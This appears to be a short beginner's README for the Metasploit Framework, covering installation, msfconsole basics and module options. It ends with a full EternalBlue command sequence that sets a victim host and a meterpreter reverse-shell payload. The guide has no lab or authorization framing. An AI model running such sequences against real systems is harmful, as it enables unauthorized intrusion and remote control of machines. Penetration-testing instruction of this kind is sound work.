# Metasploitable-Framework

#### [Read](../manual/msfconsole.txt) Metasploitable-Framework manual

## Installation

### On Kali Linux
Metasploit comes pre-installed on Kali Linux. To update it, run:
```bash
sudo apt update
sudo apt install metasploit-framework
```
## Getting Started
1. Start the Metasploit console:
```
msfconsole
```
2. Check the status of the database:

```bash
db_status
```
- If the database is not connected, start it with(Not necessary):

```bash
msfdb init
```

## Basic Command
- Search for modules: Use the __search__ command to find exploits, payloads, or auxiliary modules.
```
search <keyword>
```
example:
```
search windows
```
- Use a module: Select a module using the __use__ command.
```
use <module_path>
```
Add from the search results.
example:
```
use exploit/windows/local/ipass_launch_app
```
- Show options: Display the required options for the selected module.

```
show options
```
- Set options: Configure the options for the module.
```
set <option_name> <value>
```
- LHOST = Attacker Machine
- ROSTS = Victim   Machine
  ```
  set RHOSTS 192.168.1.10
  ```
  - set the requirements
- Now ready to exploit 
```
exploit
```
---
# Using Exploits
1. Search for an exploit:

```bash
search <exploit_name>
```
2. Select the exploit:

```bash
use <exploit_path>
```
3. Set the required options (e.g., RHOSTS, RPORT, PAYLOAD).

4. Run the exploit:

```bash
exploit
```
Example:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit
```
---
